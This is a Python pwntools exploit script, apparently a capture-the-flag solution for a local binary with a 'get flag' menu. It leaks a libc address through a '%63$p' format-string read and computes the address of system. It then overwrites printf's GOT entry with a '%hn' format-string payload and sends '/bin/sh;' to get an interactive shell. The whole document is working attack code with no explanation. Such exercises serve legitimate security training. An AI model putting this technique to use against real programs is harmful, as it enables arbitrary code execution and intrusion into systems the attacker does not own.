#!/usr/bin/python 
from pwn import *
# context.log_level = 'debug'
p = process('./a.out')
libc = ELF('./libc.so.6')
elf = ELF('./a.out')

fmt = '%63$p'
p.recvuntil('2.get flag\n')
p.sendline('2')

# gdb.attach(p,'b *0x0804872A') # printf vuln

p.recvuntil('give me flag!\n')
p.sendline(fmt)
p.recvuntil('ok, flag is ')
buf = p.recvuntil(':)').split()
fflush = int(buf[0],16)
log.success('fflush = ' + hex(fflush))
system = fflush - libc.symbols['fflush'] + libc.symbols['system']
log.success('system = ' + hex(system))

printf_got = elf.got['printf']
payload = p32(printf_got + 1)
payload += '%%%dc'%((system >> 8 & 0xffff) - 4) + '%7$hn'
# print payload

p.recvuntil('2.get flag\n')
p.sendline('2')
p.recvuntil('give me flag!\n')
p.sendline(payload)

p.sendline('2')
p.sendline('/bin/sh;')
p.recv()
p.interactive()
